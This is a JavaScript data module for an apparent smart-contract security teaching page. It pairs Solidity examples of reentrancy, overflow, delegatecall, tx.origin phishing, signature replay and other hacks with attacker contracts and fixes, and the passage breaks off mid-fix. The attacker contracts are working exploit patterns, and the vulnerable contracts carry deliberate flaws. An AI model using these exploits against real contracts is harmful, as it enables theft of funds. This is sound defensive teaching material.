/**
 * @file hacks.js
 * @description Hack Patterns view — the 18 attack write-ups published under
 *              solidity-by-example.org/hacks, summarized in our own words.
 *
 * Source: https://solidity-by-example.org/hacks/<slug>/ (Cyfrin). Every entry
 * links back to the page it summarizes. Prose here is a paraphrase, not a
 * reproduction, and the three snippets on each entry are original minimal
 * illustrations written for this page — they are not the source's contracts.
 * Snippets are teaching fragments pinned to Solidity ^0.8, not deployable code.
 *
 * `category` reuses the ten class ids declared in ../catalog.js CATEGORIES so
 * the two views can share one filter vocabulary.
 */

const page = (slug, title) => [
  { label: `${title} on Solidity by Example`, url: `https://solidity-by-example.org/hacks/${slug}/` },
];

export const HACKS = [
  {
    slug: 're-entrancy',
    name: 'Re-Entrancy',
    category: 'reentrancy',
    summary: 'Sending ether before clearing the balance lets the recipient call back in and withdraw again.',
    mechanism:
      'The withdraw function reads the caller balance, forwards the ether with a raw call, and only ' +
      'then zeroes the balance. That call hands execution to the recipient while the accounting still ' +
      'says it is owed money, so a contract with a receive function calls withdraw again from inside ' +
      'the transfer. Each nested frame passes the same check and sends the same amount, and the ' +
      'stack unwinds only once the pool is empty — a one ether deposit walks out with everyone else’s.',
    prevention:
      'Order every function checks, then effects, then interactions: write the state change before the ' +
      'external call, never after. Add a reentrancy mutex (OpenZeppelin ReentrancyGuard) as a second ' +
      'line, and prefer letting users pull funds over pushing them.',
    vulnerable: `contract EtherStore {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "nothing to withdraw");

        // Control leaves here while balances[msg.sender] is still bal.
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "send failed");

        balances[msg.sender] = 0;
    }
}`,
    attacker: `interface IEtherStore {
    function deposit() external payable;
    function withdraw() external;
}

contract Drainer {
    IEtherStore public immutable store;

    constructor(IEtherStore store_) {
        store = store_;
    }

    // Re-enters while the victim still credits us with the full balance.
    receive() external payable {
        if (address(store).balance >= 1 ether) store.withdraw();
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "seed the deposit");
        store.deposit{value: 1 ether}();
        store.withdraw();
    }
}`,
    fixed: `contract EtherStore {
    mapping(address => uint256) public balances;
    bool private locked;

    modifier noReentrant() {
        require(!locked, "no re-entrancy");
        locked = true;
        _;
        locked = false;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // Effects before the interaction, plus a mutex behind it.
    function withdraw() external noReentrant {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "nothing to withdraw");
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "send failed");
    }
}`,
    refs: page('re-entrancy', 'Re-Entrancy'),
  },
  {
    slug: 'overflow',
    name: 'Arithmetic Overflow and Underflow',
    category: 'arithmetic',
    summary: 'A wrapping addition sends a lock deadline back to zero, so a week-long timelock expires instantly.',
    mechanism:
      'A time vault records unlockAt = block.timestamp + 1 weeks and lets any depositor extend their own ' +
      'deadline with unlockAt += extraSeconds. Where that addition wraps — the default below Solidity ' +
      '0.8, and still the behaviour inside an unchecked block — passing 2**256 minus the current ' +
      'deadline rolls the sum over to zero. The withdraw guard then compares block.timestamp against ' +
      'zero and passes, so the deposit comes straight back out. The source pins its example to ^0.7.6 ' +
      'precisely because 0.8 reverts instead.',
    prevention:
      'Compile with Solidity 0.8 or later so every arithmetic operation reverts on overflow, and only ' +
      'reach for unchecked where you have proven the bound. On legacy pragmas use OpenZeppelin ' +
      'SafeMath, and bound user-supplied deltas regardless of the compiler.',
    vulnerable: `// Below 0.8 this wrapped by default; \`unchecked\` brings it back.
contract TimeLock {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public unlockAt;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        unlockAt[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint256 extraSeconds) external {
        unchecked {
            unlockAt[msg.sender] += extraSeconds; // wraps past 2**256 - 1
        }
    }

    function withdraw() external {
        require(block.timestamp > unlockAt[msg.sender], "still locked");
        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "send failed");
    }
}`,
    attacker: `interface ITimeLock {
    function deposit() external payable;
    function increaseLockTime(uint256 extraSeconds) external;
    function unlockAt(address who) external view returns (uint256);
    function withdraw() external;
}

contract Unlocker {
    ITimeLock public immutable lock;

    constructor(ITimeLock lock_) {
        lock = lock_;
    }

    receive() external payable {}

    function attack() external payable {
        lock.deposit{value: msg.value}();
        // Find x with t + x == 2**256 == 0, i.e. x == -t.
        uint256 t = lock.unlockAt(address(this));
        unchecked {
            lock.increaseLockTime(type(uint256).max - t + 1);
        }
        lock.withdraw();
    }
}`,
    fixed: `contract TimeLock {
    uint256 public constant MAX_EXTENSION = 30 days;

    mapping(address => uint256) public balances;
    mapping(address => uint256) public unlockAt;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        unlockAt[msg.sender] = block.timestamp + 1 weeks;
    }

    // Checked arithmetic reverts on wrap; the bound keeps it sane.
    function increaseLockTime(uint256 extraSeconds) external {
        require(extraSeconds <= MAX_EXTENSION, "extension too large");
        unlockAt[msg.sender] += extraSeconds;
    }

    function withdraw() external {
        require(block.timestamp > unlockAt[msg.sender], "still locked");
        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "send failed");
    }
}`,
    refs: page('overflow', 'Arithmetic Overflow and Underflow'),
  },
  {
    slug: 'self-destruct',
    name: 'Self Destruct',
    category: 'low-level',
    summary: 'selfdestruct pushes ether into a contract that runs no code to receive it, breaking any balance invariant.',
    mechanism:
      'A game accepts exactly one ether per deposit and declares a winner when address(this).balance ' +
      'reaches its seven ether target. An attacker funds a throwaway contract and calls selfdestruct ' +
      'with the game as beneficiary; that transfer executes no code in the game, so no require and no ' +
      'receive function can refuse it and the balance jumps past the target. Every later deposit now ' +
      'reverts on the balance check and the winner is never assigned — the pot is frozen. Coinbase ' +
      'rewards and ether pre-sent to a computed address do the same thing.',
    prevention:
      'Never branch on address(this).balance. Track deposits in a state variable the contract ' +
      'increments itself, so only money that arrived through a function you wrote counts toward the ' +
      'invariant, and the forced transfer becomes a harmless donation.',
    vulnerable: `contract EtherGame {
    uint256 public constant TARGET = 7 ether;
    address public winner;

    function deposit() external payable {
        require(msg.value == 1 ether, "send exactly 1 ether");

        // Anyone can move this number without calling deposit().
        uint256 balance = address(this).balance;
        require(balance <= TARGET, "game over");

        if (balance == TARGET) winner = msg.sender;
    }

    function claimReward() external {
        require(msg.sender == winner, "not winner");
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "send failed");
    }
}`,
    attacker: `contract ForceFeeder {
    // selfdestruct forwards the whole balance to the beneficiary without
    // invoking any code there, so the target cannot reject it.
    function attack(address payable target) external payable {
        selfdestruct(target);
    }
}`,
    fixed: `contract EtherGame {
    uint256 public constant TARGET = 7 ether;

    // Counted by us, not read from the chain.
    uint256 public deposited;
    address public winner;

    function deposit() external payable {
        require(msg.value == 1 ether, "send exactly 1 ether");

        deposited += msg.value;
        require(deposited <= TARGET, "game over");

        if (deposited == TARGET) winner = msg.sender;
    }

    function claimReward() external {
        require(msg.sender == winner, "not winner");
        uint256 amount = deposited;
        deposited = 0;
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "send failed");
    }
}`,
    refs: page('self-destruct', 'Self Destruct'),
  },
  {
    slug: 'accessing-private-data',
    name: 'Accessing Private Data',
    category: 'storage-layout',
    summary: 'private is a compile-time visibility keyword; every storage slot is readable by anyone with an RPC endpoint.',
    mechanism:
      'State variables occupy 32-byte slots numbered from zero in declaration order, with adjacent ' +
      'small types packed into one slot from the right. Reading slot n of any address is a plain ' +
      'eth_getStorageAt call that no contract can intercept, so a bytes32 marked private is one ' +
      'request away. Dynamic data is equally reachable: array element i of the array whose length ' +
      'lives at slot p sits at keccak256(p) + i * elementSize, and mapping entry k at ' +
      'keccak256(k, p). The private keyword only stops other Solidity contracts from naming it.',
    prevention:
      'Do not put secrets on-chain. Store a keccak256 commitment instead of the value and reveal in a ' +
      'later transaction, keep the plaintext off-chain, or encrypt it under a key that never touches ' +
      'the chain. Salt the commitment with msg.sender so a revealed preimage cannot be replayed.',
    vulnerable: `contract Vault {
    uint256 public count = 123;      // slot 0
    address public owner;             // slot 1, packed with the next two
    bool public isActive = true;      // slot 1
    uint16 public fee = 31;           // slot 1
    bytes32 private password;         // slot 2 - readable by anyone

    constructor(bytes32 password_) {
        owner = msg.sender;
        password = password_;
    }

    function unlock(bytes32 guess) external view returns (bool) {
        return guess == password;
    }
}`,
    attacker: `// No exploit contract is needed: the read happens off-chain and
// nothing deployed can observe or block it.
//
//   eth_getStorageAt(vault, "0x2", "latest")  ->  the "private" password
//   cast storage <vault> 2                    ->  the same word
//
// The recovered word is then replayed through the front door:
interface IVault {
    function unlock(bytes32 guess) external view returns (bool);
}

contract Unlock {
    function attack(IVault vault, bytes32 leakedPassword)
        external
        view
        returns (bool)
    {
        return vault.unlock(leakedPassword);
    }
}`,
    fixed: `contract Vault {
    address public immutable owner;

    // A commitment, not the secret. Salted with the caller so a revealed
    // preimage cannot be replayed by whoever saw it in the mempool.
    bytes32 private immutable passwordHash;

    constructor(bytes32 passwordHash_) {
        owner = msg.sender;
        passwordHash = passwordHash_;
    }

    function unlock(bytes32 guess) external view returns (bool) {
        return keccak256(abi.encodePacked(guess, msg.sender)) == passwordHash;
    }
}`,
    refs: page('accessing-private-data', 'Accessing Private Data'),
  },
  {
    slug: 'delegatecall',
    name: 'Delegatecall',
    category: 'storage-layout',
    summary: 'delegatecall runs someone else’s code against your storage, so their slot layout silently becomes yours.',
    mechanism:
      'delegatecall keeps the caller’s storage, address, msg.sender and msg.value while executing ' +
      'the callee’s bytecode, and slots are matched by position, never by name. When the two ' +
      'contracts declare different variables the library writes wherever its own layout points: a ' +
      'library whose first variable is a uint overwrites the caller’s first variable, which here ' +
      'happens to be the address of the library itself. The attacker passes their own address as that ' +
      '"number", repoints the target at their contract, then calls again to execute arbitrary code in ' +
      'the target’s context and take ownership. The simpler variant needs no layout trick at all — ' +
      'a fallback that forwards raw msg.data lets anyone choose which library function runs.',
    prevention:
      'Only delegatecall to an address fixed at deployment (immutable or a hard-coded constant), never ' +
      'to one a caller can influence, and never forward unfiltered msg.data. Prefer a stateless ' +
      'library, which cannot declare storage of its own; when a proxy genuinely needs state, keep the ' +
      'layouts identical and put proxy-owned values in EIP-1967 hashed slots.',
    vulnerable: `contract Lib {
    uint256 public someNumber;            // slot 0
    function doSomething(uint256 n) public {
        someNumber = n;
    }
}

contract HackMe {
    address public lib;                   // slot 0 <- Lib writes here
    address public owner;                 // slot 1
    uint256 public someNumber;            // slot 2

    constructor(address lib_) {
        lib = lib_;
        owner = msg.sender;
    }

    // Lib's code, HackMe's storage, and the layouts disagree.
    function doSomething(uint256 n) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", n));
    }
}`,
    attacker: `interface IHackMe {
    function doSomething(uint256 n) external;
}

contract Attack {
    // Layout mirrors HackMe so our writes land where we intend.
    address public lib;        // slot 0
    address public owner;      // slot 1
    uint256 public someNumber; // slot 2

    IHackMe public immutable hackMe;

    constructor(IHackMe hackMe_) {
        hackMe = hackMe_;
    }

    function attack() external {
        // 1. The "number" is our address, and it lands in slot 0 = lib.
        hackMe.doSomething(uint256(uint160(address(this))));
        // 2. HackMe now delegatecalls into the function below.
        hackMe.doSomething(1);
    }

    function doSomething(uint256) public {
        owner = msg.sender; // writes HackMe.owner
    }
}`,
    fixed: `library Math {
    // A \`library\` declares no state of its own, so code running under
    // delegatecall has no layout that could collide with the caller's.
    function double(uint256 n) internal pure returns (uint256) {
        return n * 2;
    }
}

contract HackMe {
    address public owner;
    uint256 public someNumber;

    constructor() {
        owner = msg.sender;
    }

    // No raw delegatecall, no caller-supplied target, no forwarded
    // calldata: the callee is decided at compile time.
    function doSomething(uint256 n) public {
        someNumber = Math.double(n);
    }
}`,
    refs: page('delegatecall', 'Delegatecall'),
  },
  {
    slug: 'randomness',
    name: 'Source of Randomness',
    category: 'randomness',
    summary: 'Entropy derived from blockhash and block.timestamp is readable by anyone executing in the same block.',
    mechanism:
      'A guessing game hashes blockhash(block.number - 1) together with block.timestamp and pays out ' +
      'when the caller’s number matches. Both inputs are ordinary EVM values available to every ' +
      'contract executing in that block, so an attacker copies the expression into their own contract, ' +
      'computes the answer, and calls guess with it in the same transaction. There is nothing to brute ' +
      'force: the "random" number is a pure function of data the caller already has.',
    prevention:
      'Derive nothing valuable from block data. Use a verifiable random function such as Chainlink ' +
      'VRF, which returns its value in a later block along with a proof, or a commit-reveal scheme ' +
      'where participants lock in a secret before the seed exists. Always settle in a different block ' +
      'from the one that fixed the commitment.',
    vulnerable: `contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint256 n) external {
        // Both inputs are visible to every contract in this same block.
        uint256 answer = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );

        if (n == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "send failed");
        }
    }
}`,
    attacker: `interface IGuess {
    function guess(uint256 n) external;
}

contract Predictor {
    receive() external payable {}

    // Same block, same inputs, same hash - no guessing involved.
    function attack(IGuess game) external {
        uint256 answer = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number - 1), block.timestamp)
            )
        );
        game.guess(answer);
    }
}`,
    fixed: `interface IVRFCoordinator {
    function requestRandomWords(bytes32 keyHash, uint64 subId)
        external
        returns (uint256 requestId);
}

contract Lottery {
    IVRFCoordinator public immutable coordinator;
    mapping(uint256 => address) public playerOf;

    constructor(IVRFCoordinator coordinator_) {
        coordinator = coordinator_;
    }

    function play(bytes32 keyHash, uint64 subId) external payable {
        playerOf[coordinator.requestRandomWords(keyHash, subId)] = msg.sender;
    }

    // Settled in a later block from a proven value that no participant
    // and no block proposer could compute in advance.
    function fulfillRandomWords(uint256 id, uint256[] calldata words)
        external
    {
        require(msg.sender == address(coordinator), "not the coordinator");
        address player = playerOf[id];
        delete playerOf[id];
        if (words[0] % 100 == 0) payable(player).transfer(1 ether);
    }
}`,
    refs: page('randomness', 'Source of Randomness'),
  },
  {
    slug: 'denial-of-service',
    name: 'Denial of Service',
    category: 'dos',
    summary: 'Pushing a refund to the previous holder lets a contract that refuses ether freeze the game forever.',
    mechanism:
      'Claiming the throne requires out-bidding the sitting king and refunding them in the same call, ' +
      'and the refund is a require-checked send. An attacker claims from a contract with no receive ' +
      'and no fallback, so every later claim reverts inside that refund before the new king is ' +
      'recorded. The attacker never has to act again; the contract is simply stuck. A contract that ' +
      'burns all forwarded gas achieves the same even where the caller ignores the return value.',
    prevention:
      'Use pull over push: credit the amount owed to a balance the recipient withdraws in their own ' +
      'transaction, so one uncooperative address can only block itself. The same rule applies to loops ' +
      'over user-supplied lists — one reverting entry must never be able to abort the whole batch.',
    vulnerable: `contract KingOfEther {
    address public king;
    uint256 public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "pay more than the king");

        // If the sitting king refuses this, nobody can ever succeed them.
        (bool sent, ) = king.call{value: balance}("");
        require(sent, "refund failed");

        balance = msg.value;
        king = msg.sender;
    }
}`,
    attacker: `interface IKingOfEther {
    function claimThrone() external payable;
}

// No receive, no fallback: every refund sent here reverts, so the
// throne can never change hands again.
contract Squatter {
    IKingOfEther public immutable game;

    constructor(IKingOfEther game_) {
        game = game_;
    }

    function attack() external payable {
        game.claimThrone{value: msg.value}();
    }
}`,
    fixed: `contract KingOfEther {
    address public king;
    uint256 public balance;
    mapping(address => uint256) public owed;

    // Credit the old king instead of paying them: claiming cannot fail
    // on someone else's behaviour.
    function claimThrone() external payable {
        require(msg.value > balance, "pay more than the king");

        owed[king] += balance;
        balance = msg.value;
        king = msg.sender;
    }

    function withdraw() external {
        require(msg.sender != king, "the king cannot withdraw");
        uint256 amount = owed[msg.sender];
        owed[msg.sender] = 0;
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "send failed");
    }
}`,
    refs: page('denial-of-service', 'Denial of Service'),
  },
  {
    slug: 'phishing-with-tx-origin',
    name: 'Phishing with tx.origin',
    category: 'access-control',
    summary: 'An owner check on tx.origin authorizes the whole call chain, so any contract the owner touches can act as them.',
    mechanism:
      'tx.origin is the externally owned account that signed the transaction and stays constant ' +
      'through every nested call; msg.sender is only the immediate caller. A wallet that compares ' +
      'tx.origin to its owner therefore accepts a call relayed by any contract, as long as the owner ' +
      'started the transaction. The attacker only has to get the owner to call one function on a ' +
      'contract they control — a claim page, a mint, a swap router — and that contract calls the ' +
      'wallet’s transfer for them. No approval and no signature is involved, so nothing warns the owner.',
    prevention:
      'Authorize on msg.sender, which names the caller directly in front of you and cannot be ' +
      'inherited by an intermediary. Use OpenZeppelin Ownable or AccessControl, and keep tx.origin out ' +
      'of authorization decisions entirely.',
    vulnerable: `contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    // tx.origin is the signer, not the caller: any contract the owner
    // is persuaded to call can relay this.
    function transfer(address payable to, uint256 amount) external {
        require(tx.origin == owner, "not owner");
        (bool sent, ) = to.call{value: amount}("");
        require(sent, "send failed");
    }
}`,
    attacker: `interface IWallet {
    function transfer(address payable to, uint256 amount) external;
}

contract Phish {
    IWallet public immutable wallet;
    address payable public immutable attacker;

    constructor(IWallet wallet_) {
        wallet = wallet_;
        attacker = payable(msg.sender);
    }

    // Advertised as "claim your airdrop". The owner calls this, so
    // tx.origin inside Wallet.transfer is still the owner.
    function claim() external {
        wallet.transfer(attacker, address(wallet).balance);
    }
}`,
    fixed: `contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    // msg.sender is the contract or account immediately in front of us,
    // so a relaying contract fails this check.
    function transfer(address payable to, uint256 amount) external {
        require(msg.sender == owner, "not owner");
        (bool sent, ) = to.call{value: amount}("");
        require(sent, "send failed");
    }
}`,
    refs: page('phishing-with-tx-origin', 'Phishing with tx.origin'),
  },
  {
    slug: 'hiding-malicious-code-with-external-contract',
    name: 'Hiding Malicious Code with External Contract',
    category: 'low-level',
    summary: 'Casting an address to a contract type is a compile-time fiction, so the reviewed source says nothing about the code that runs.',
    mechanism:
      'A contract stores a dependency address given to its constructor and calls a method on it. ' +
      'Solidity’s cast compiles to nothing more than a call carrying that method’s selector to ' +
      'whatever address was supplied — the type is never checked on-chain. The deployer passes the ' +
      'address of a contract the reviewer never saw, so a reader who verified both published sources ' +
      'still ends up executing hidden code. A contract without a matching function participates too: ' +
      'the call falls through to its fallback.',
    prevention:
      'Create the dependency inside the constructor with new so the bytecode is fixed by your own ' +
      'deployment, or expose the address as public immutable and verify the deployed code before ' +
      'trusting it. Treat any address you were handed as untrusted, and pin it by codehash if it must ' +
      'be configurable.',
    vulnerable: `interface IBar {
    function log() external;
}

contract Foo {
    IBar private bar; // whatever address the deployer chose

    constructor(address bar_) {
        bar = IBar(bar_);
    }

    // Reads as "call Bar.log()". It is really "call selector log() at
    // an address nobody reviewed".
    function callBar() external {
        bar.log();
    }
}`,
    attacker: `// Deployed from a source file the reviewer never sees. Its address is
// handed to Foo's constructor in place of the audited Bar.
contract Mal {
    event Log(string message);

    address public owner;

    function log() external {
        owner = msg.sender;
        emit Log("Mal was called");
    }

    // Even without a matching function the call would land here.
    fallback() external payable {
        emit Log("fallback was called");
    }
}`,
    fixed: `contract Bar {
    event Log(string message);

    function log() external {
        emit Log("Bar was called");
    }
}

contract Foo {
    // Created here, so its bytecode is fixed by this deployment, and
    // public so anyone can read the address off-chain and verify it.
    Bar public immutable bar;

    constructor() {
        bar = new Bar();
    }

    function callBar() external {
        bar.log();
    }
}`,
    refs: page(
      'hiding-malicious-code-with-external-contract',
      'Hiding Malicious Code with External Contract'
    ),
  },
  {
    slug: 'honeypot',
    name: 'Honeypot',
    category: 'low-level',
    summary: 'A bank left deliberately reentrant, whose hidden logger reverts on withdraw, so the attacker only pays gas.',
    mechanism:
      'The bank sends ether before decrementing the balance — an obvious reentrancy that an attacker ' +
      'will find and take. But the bank also reports every action to a logger address supplied at ' +
      'deployment, and the deployed instance is not the innocent Logger whose source is published: it ' +
      'reverts whenever the action string is "Withdraw". The attacker’s reentrant chain runs to ' +
      'completion, then the final logger call reverts and unwinds the entire transaction, deposit ' +
      'included. It is the hidden-external-contract trick pointed the other way.',
    prevention:
      'From the attacker’s side: read the deployed bytecode of every address a target depends on ' +
      'and simulate against a fork before committing funds — published source proves nothing about ' +
      'the code at an address. From the builder’s side a trap is not a fix: write the bank ' +
      'checks-effects-interactions and create its logger with new so nobody can substitute it.',
    vulnerable: `interface ILogger {
    function log(address caller, uint256 amount, string calldata action)
        external;
}

contract Bank {
    mapping(address => uint256) public balances;
    ILogger private logger; // set at deployment, code unknown

    constructor(ILogger logger_) {
        logger = logger_;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        logger.log(msg.sender, msg.value, "Deposit");
    }

    // Reentrant on purpose - the bait.
    function withdraw(uint256 amount) external {
        require(amount <= balances[msg.sender], "insufficient funds");
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "send failed");
        balances[msg.sender] -= amount;
        logger.log(msg.sender, amount, "Withdraw"); // the trap
    }
}`,
    attacker: `interface IBank {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

// Takes the bait. The reentrancy works exactly as expected; the whole
// transaction then reverts inside the logger call and nothing is kept.
contract Attack {
    IBank public immutable bank;

    constructor(IBank bank_) {
        bank = bank_;
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) bank.withdraw(1 ether);
    }

    function attack() external payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }
}`,
    fixed: `contract Logger {
    event Log(address caller, uint256 amount, string action);

    function log(address caller, uint256 amount, string calldata action)
        external
    {
        emit Log(caller, amount, action);
    }
}

contract Bank {
    mapping(address => uint256) public balances;

    // Created here and readable, so no substitution is possible.
    Logger public immutable logger;

    constructor() {
        logger = new Logger();
    }

    function withdraw(uint256 amount) external {
        require(amount <= balances[msg.sender], "insufficient funds");
        balances[msg.sender] -= amount;      // effect
        logger.log(msg.sender, amount, "Withdraw");
        (bool sent, ) = msg.sender.call{value: amount}(""); // interaction
        require(sent, "send failed");
    }
}`,
    refs: page('honeypot', 'Honeypot'),
  },
  {
    slug: 'front-running',
    name: 'Front Running',
    category: 'economic',
    summary: 'A valuable answer submitted as plaintext calldata is copied out of the mempool and mined first by someone else.',
    mechanism:
      'A puzzle contract pays out to whoever submits the preimage of a fixed hash. The solver’s ' +
      'transaction sits in the public mempool before inclusion, and its calldata contains the answer ' +
      'in the clear. Anyone watching copies the argument into their own transaction, attaches a higher ' +
      'priority fee or sends it straight to a block builder as a bundle, and is ordered ahead. Nothing ' +
      'is broken cryptographically — the vulnerability is that transaction ordering is for sale and ' +
      'the payload was valuable on its own.',
    prevention:
      'Split the action into commit and reveal across two blocks, and bind the commitment to ' +
      'msg.sender — keccak256(sender, solution, secret) — so a copied commitment is worthless to ' +
      'whoever copied it. Where a commit-reveal does not fit, remove the public window instead: ' +
      'private order flow, batch auctions, or a sealed-bid mechanism.',
    vulnerable: `contract FindThisHash {
    bytes32 public constant TARGET =
        0x564ccaf7594d66b1eaaea24fe01f0585bf52ee70852af4eac0cc4b04711cd0e2;

    constructor() payable {}

    // \`solution\` travels through the public mempool in the clear, and
    // the contract cannot tell who found it from who copied it.
    function solve(string calldata solution) external {
        require(keccak256(abi.encodePacked(solution)) == TARGET, "wrong");
        (bool sent, ) = msg.sender.call{value: 10 ether}("");
        require(sent, "send failed");
    }
}`,
    attacker: `interface IFindThisHash {
    function solve(string calldata solution) external;
}

// The searcher watches pending transactions off-chain, lifts the
// plaintext argument out of the victim's calldata, and resubmits it with
// a higher priority fee - or as a bundle straight to a block builder.
contract Sniper {
    IFindThisHash public immutable game;

    constructor(IFindThisHash game_) {
        game = game_;
    }

    receive() external payable {}

    function frontRun(string calldata copiedSolution) external {
        game.solve(copiedSolution);
    }
}`,
    fixed: `contract SecuredFindThisHash {
    bytes32 public constant TARGET =
        0x564ccaf7594d66b1eaaea24fe01f0585bf52ee70852af4eac0cc4b04711cd0e2;

    mapping(address => bytes32) public commitOf;
    mapping(address => uint256) public commitBlockOf;

    // Phase 1: publish a hash. Copying it gains nothing, because it is
    // bound to the committer's address.
    function commit(bytes32 commitment) external {
        require(commitBlockOf[msg.sender] == 0, "already committed");
        commitOf[msg.sender] = commitment;
        commitBlockOf[msg.sender] = block.number;
    }

    // Phase 2: reveal in a later block.
    function reveal(string calldata solution, string calldata secret)
        external
    {
        require(block.number > commitBlockOf[msg.sender], "too early");
        bytes32 h =
            keccak256(abi.encodePacked(msg.sender, solution, secret));
        require(h == commitOf[msg.sender], "commitment mismatch");
        require(keccak256(abi.encodePacked(solution)) == TARGET, "wrong");
        delete commitOf[msg.sender];
        (bool sent, ) = msg.sender.call{value: 10 ether}("");
        require(sent, "send failed");
    }
}`,
    refs: page('front-running', 'Front Running'),
  },
  {
    slug: 'block-timestamp-manipulation',
    name: 'Block Timestamp Manipulation',
    category: 'randomness',
    summary: 'A block proposer chooses the timestamp within a window, so any outcome keyed to its exact value is theirs to pick.',
    mechanism:
      'A roulette pays out the whole balance when block.timestamp % 15 == 0. The proposer building a ' +
      'block sets that timestamp, constrained only by having to exceed the parent’s and not to run ' +
      'too far ahead of other nodes’ clocks — so nudging it onto a multiple of 15 and including ' +
      'their own spin is free. Even a participant who proposes nothing gets a free option: they read ' +
      'the pending block’s timestamp and only send the transaction when it already wins, reverting ' +
      'otherwise.',
    prevention:
      'Never derive a payout, a nonce or any entropy from block.timestamp, and never branch on its low ' +
      'bits. It is a fine coarse clock — deadlines measured in hours or days tolerate the few seconds ' +
      'a proposer can shift — but anything finer needs a value the proposer cannot choose, such as a ' +
      'VRF response delivered in a later block.',
    vulnerable: `contract Roulette {
    uint256 public lastSpin;

    constructor() payable {}

    function spin() external payable {
        require(msg.value == 10 ether, "wrong stake");
        require(block.timestamp != lastSpin, "one spin per block");
        lastSpin = block.timestamp;

        // The proposer picks this number.
        if (block.timestamp % 15 == 0) {
            (bool sent, ) = msg.sender.call{value: address(this).balance}("");
            require(sent, "send failed");
        }
    }
}`,
    attacker: `interface IRoulette {
    function spin() external payable;
}

// A proposer simply chooses a winning timestamp. Everyone else takes the
// same bet risk-free by refusing to play on a losing block.
contract Spinner {
    IRoulette public immutable roulette;

    constructor(IRoulette roulette_) {
        roulette = roulette_;
    }

    receive() external payable {}

    function attack() external payable {
        require(block.timestamp % 15 == 0, "not a winning block");
        roulette.spin{value: 10 ether}();
    }
}`,
    fixed: `contract Roulette {
    // Windows measured in days: the seconds a proposer can shift cannot
    // change which side of a boundary a call lands on.
    uint256 public immutable opensAt;
    uint256 public immutable closesAt;
    address public immutable oracle;

    constructor(address oracle_) payable {
        oracle = oracle_;
        opensAt = block.timestamp + 1 days;
        closesAt = block.timestamp + 8 days;
    }

    // The clock only gates the window. The outcome comes from a value
    // delivered in a later block that no proposer could choose.
    function settle(address payable player, uint256 randomWord) external {
        require(msg.sender == oracle, "not oracle");
        require(block.timestamp >= opensAt, "not open");
        require(block.timestamp < closesAt, "closed");

        if (randomWord % 15 == 0) {
            (bool sent, ) = player.call{value: address(this).balance}("");
            require(sent, "send failed");
        }
    }
}`,
    refs: page('block-timestamp-manipulation', 'Block Timestamp Manipulation'),
  },
  {
    slug: 'signature-replay',
    name: 'Signature Replay',
    category: 'crypto',
    summary: 'A signature that authorizes an action but not a specific instance of it can be submitted again and again.',
    mechanism:
      'A two-of-two wallet hashes only the recipient and the amount, recovers both owners from the ' +
      'supplied signatures, and pays out. Nothing records that the hash was already honoured, and the ' +
      'signature bytes become public the moment the first transfer is mined — so anyone can resubmit ' +
      'the same pair and move the same amount repeatedly until the wallet is empty. Because the hash ' +
      'also omits the verifying contract’s address and the chain id, the same signatures authorize ' +
      'a transfer on any other deployment with those owners, on any chain.',
    prevention:
      'Sign a message that identifies exactly one execution: a per-signer nonce, an expiry, the ' +
      'verifying contract’s address, and block.chainid — which is what an EIP-712 domain separator ' +
      'packages. Then record the executed digest and reject it on the second attempt. Use OpenZeppelin ' +
      'ECDSA.recover so malleable and zero-address recoveries revert rather than passing.',
    vulnerable: `contract MultiSigWallet {
    address[2] public owners;

    constructor(address[2] memory owners_) payable {
        owners = owners_;
    }

    // No nonce, no expiry, no contract address, no chain id, and no
    // record that this hash was already paid.
    function txHash(address to, uint256 amount)
        public
        pure
        returns (bytes32)
    {
        return keccak256(abi.encodePacked(to, amount));
    }

    function transfer(address to, uint256 amount, bytes[2] calldata sigs)
        external
    {
        bytes32 digest = _ethSigned(txHash(to, amount));
        for (uint256 i = 0; i < 2; i++) {
            require(_recover(digest, sigs[i]) == owners[i], "invalid sig");
        }
        (bool sent, ) = to.call{value: amount}("");
        require(sent, "send failed");
    }
}`,
    attacker: `interface IMultiSigWallet {
    function transfer(address to, uint256 amount, bytes[2] calldata sigs)
        external;
}

// The signatures were public from the first mined transfer. Nothing here
// forges anything - it just asks again.
contract Replayer {
    function drain(
        IMultiSigWallet wallet,
        address to,
        uint256 amount,
        bytes[2] calldata capturedSigs,
        uint256 times
    ) external {
        for (uint256 i = 0; i < times; i++) {
            wallet.transfer(to, amount, capturedSigs);
        }
    }
}`,
    fixed: `contract MultiSigWallet {
    address[2] public owners;
    mapping(bytes32 => bool) public executed;

    constructor(address[2] memory owners_) payable {
        owners = owners_;
    }

    // Bound to this contract, this chain, and one nonce.
    function txHash(address to, uint256 amount, uint256 nonce)
